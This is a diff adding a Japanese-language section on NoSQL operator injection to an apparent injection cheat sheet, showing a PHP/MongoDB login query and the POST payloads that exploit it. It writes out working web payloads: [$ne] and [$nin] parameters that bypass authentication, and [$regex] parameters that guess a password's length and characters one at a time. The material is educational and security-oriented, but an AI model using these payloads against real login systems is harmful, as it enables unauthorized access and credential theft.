@@ -156,6 +156,45 @@ AND -> &&
 OR -> ||
 ```
 
+## NoSQL
+
+### 演算子インジェクション
+
+#### 認証バイパス
+```php
+# このクエリを想定したとき、
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
+
+# このポストデータを渡すと、
+user[$ne]=xxxx&pass[$ne]=yyyy
+
+# この連想配列として解釈されるため、
+$_POST = [
+    'user' => ['$ne' => 'xxxx'],
+    'pass' => ['$ne' => 'yyyy']
+];
+
+# すべてのデータを抽出するクエリになる
+$q = new MongoDB\Driver\Query(['username'=>['$ne' => 'xxx'], 'password'=>['$ne' => 'yyy']]);
+
+# admin, user1 以外のユーザー
+user[$nin][]=admin&user[$nin][]=user1&pass[$ne]=yyyy
+
+$q = new MongoDB\Driver\Query(['username'=>['$nin' => ['admin', 'user1']], 'password'=>['$ne' => 'yyy']]);
+```
+
+#### パスワード推測
+```php
+# これでログインできるなら、パスワードは5文字
+user=admin&pass[$regex]=^.{5}$
+
+# これでログインできるなら、1文字目はc
+user=admin&pass[$regex]=^c....$
+
+```
+
 ## セキュリティ
 
 - フレームワークの Prepared Statements を使用する
